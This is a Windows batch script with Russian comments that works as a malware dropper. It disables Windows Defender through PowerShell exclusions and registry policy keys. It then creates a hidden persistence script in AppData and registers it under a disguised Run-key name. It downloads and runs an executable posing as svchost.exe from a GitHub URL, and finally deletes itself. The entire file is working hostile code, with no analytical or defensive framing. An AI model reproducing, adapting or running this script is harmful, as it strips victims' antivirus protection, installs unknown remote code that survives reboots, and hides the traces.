@echo off

REM Отключаем Windows Defender через PowerShell
powershell -ExecutionPolicy Bypass -Command "try {if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {$ProgramFiles = [System.Environment]::GetFolderPath('ProgramFilesX86');$updpath = $ProgramFiles -replace ' \(x86\)', '';Add-MpPreference -ExclusionPath $updpath;$ProgramFilesX86 = [System.Environment]::GetFolderPath('ProgramFilesX86');if (Test-Path $ProgramFilesX86) {Add-MpPreference -ExclusionPath $ProgramFilesX86};$AppData = [System.Environment]::GetFolderPath('ApplicationData');Add-MpPreference -ExclusionPath $AppData;$LocalAppData = [System.Environment]::GetFolderPath('LocalApplicationData');Add-MpPreference -ExclusionPath $LocalAppData;Add-MpPreference -ExclusionExtension '.exe';Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableScriptScanning $true}}catch {}" >nul 2>&1

REM Отключаем через реестр
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1

REM Создаем постоянный батник в скрытой папке AppData
set "PERSIST_DIR=%APPDATA%\Microsoft\CLR"
if not exist "%PERSIST_DIR%" mkdir "%PERSIST_DIR%" >nul 2>&1
set "PERSIST_PATH=%PERSIST_DIR%\UsageLogs.bat"
(
echo @echo off
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$url='https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe';$path='%%TEMP%%\svchost.exe';try{Invoke-WebRequest -Uri $url -OutFile $path;Start-Process -FilePath $path}catch{}"
) > "%PERSIST_PATH%"

REM Добавляем в автозагрузку через реестр (скрытно)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CLRUsageLog" /t REG_SZ /d "\"%PERSIST_PATH%\"" /f >nul 2>&1

REM Скачиваем и запускаем .exe через PowerShell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$url='https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe';$path='%TEMP%\svchost.exe';Invoke-WebRequest -Uri $url -OutFile $path;Start-Process -FilePath $path;Start-Sleep -Seconds 2;Remove-Item -Path $path -Force"

REM Удаляем себя
timeout /t 1 /nobreak >nul
del "%~f0"
